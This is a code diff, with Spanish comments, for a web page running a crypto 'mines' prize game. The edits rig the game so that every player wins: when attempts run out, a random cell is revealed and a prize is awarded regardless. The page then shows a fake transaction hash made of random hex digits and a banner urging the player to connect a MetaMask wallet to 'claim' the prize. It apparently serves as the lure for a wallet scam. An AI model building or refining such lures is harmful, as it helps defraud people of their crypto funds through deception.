@@ -565,72 +565,62 @@
             }
         }
 
-        // Modifica handleCellClick (elimina el número de intento)
 function handleCellClick(event) {
     if (attempts <= 0) return;
-    
+
     const cell = event.target;
     const index = parseInt(cell.dataset.index);
-    
+
     if (revealedCells.has(index)) return;
-    
+
     revealedCells.add(index);
     cell.classList.add('revealed');
-    
+
     if (index === minePosition) {
-        // Animación más larga con doble timeout
         setTimeout(() => {
-            awardPrize(cell);
+            awardPrize(cell); // Premio en la celda correcta
         }, 800);
     } else {
         attempts--;
         document.getElementById('attempts').textContent = attempts;
-        
+
         if (attempts === 0) {
             setTimeout(() => {
                 const forcedCell = findRandomUnrevealedCell();
+                revealedCells.add(parseInt(forcedCell.dataset.index)); // evita clicks posteriores
                 forcedCell.classList.add('revealed');
-                awardPrize(forcedCell);
-            }, 1000);
+
+                // Espera a que se vea revelada antes de premiar
+                setTimeout(() => {
+                    awardPrize(forcedCell);
+                }, 800);
+            }, 500); // tiempo más corto para mostrar que se revela automáticamente
         }
     }
 }
-        function awardPrize(cell) {
-            const prize = cryptoPrizes[Math.floor(Math.random() * cryptoPrizes.length)];
-            const amount = prize.amount();
-            
-            cell.classList.add('mine');
-            cell.innerHTML = `
-               <div class="token-icon">${prize.token}</div>
-  ${amount}
-`;
 
-setTimeout(() => {
+      function awardPrize(cell) {
+    const prize = cryptoPrizes[Math.floor(Math.random() * cryptoPrizes.length)];
+    const amount = prize.amount();
+
     cell.classList.add('mine');
     cell.innerHTML = `
         <div class="token-icon">${prize.token}</div>
         ${amount}
     `;
-    
-    // Mensaje con retraso adicional
-    setTimeout(() => {
-        document.getElementById('prize-info').innerHTML = `...`;
-    }, 1000);
-}, 800);
-		
-   document.getElementById('prize-info').innerHTML = `
-    🎉 ¡Conecta para reclamar!<br>
-    <strong>${amount} ${prize.token}</strong><br>
-    <small>Tx: 0x${Array.from({length: 16}, () => 
-        Math.floor(Math.random() * 16).toString(16)).join('')}...</small><br><br>
-    <span class="casino-alert">🔒 Conecta tu wallet Metamask para reclamar tu premio</span>
-`;
 
+    document.getElementById('prize-info').innerHTML = `
+        🎉 ¡Conecta para reclamar!<br>
+        <strong>${amount} ${prize.token}</strong><br>
+        <small>Tx: 0x${Array.from({length: 16}, () => 
+            Math.floor(Math.random() * 16).toString(16)).join('')}...</small><br><br>
+        <span class="casino-alert">🔒 Conecta tu wallet Metamask para reclamar tu premio</span>
+    `;
 
-            
-            attempts = 0;
-            document.getElementById('attempts').textContent = 0;
-        }
+    attempts = 0;
+    document.getElementById('attempts').textContent = 0;
+}
+
 
         function findRandomUnrevealedCell() {
             let availableCells = Array.from(document.querySelectorAll('.cell:not(.revealed)'));
